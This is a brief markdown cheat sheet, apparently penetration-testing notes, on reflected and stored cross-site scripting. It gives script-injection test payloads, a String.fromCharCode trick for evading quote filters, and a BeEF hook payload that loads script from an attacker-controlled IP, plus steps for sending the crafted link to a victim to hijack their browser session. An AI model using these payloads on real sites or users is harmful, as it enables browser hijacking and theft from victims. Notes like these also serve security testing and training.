### Reflected XSS
* Try to insert some javascript in input fields
* Copy URL and send it to the victim

### Stored XSS
* Javascript gets copied to the site or DB

### XSS
* Try to insert some javascript code:
  ```html
  <script>alert('<code>');</script>
  ```
* [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* To avoid using **'** and **"**, use the **String.fromCharCode()** function
  ```html
  <script>alert(String.fromCharCode(<charASCII>,<charASCII>,...));</script>
  ```
* Use BEEF (beef:beef)
  * Use the following javascript code
    ```html
    <script src="<IP>:3000/hook.js"></script>
    ```
  * Send URL with javascript code to the victim
  * When victim opens url, youll get a session in BEEF
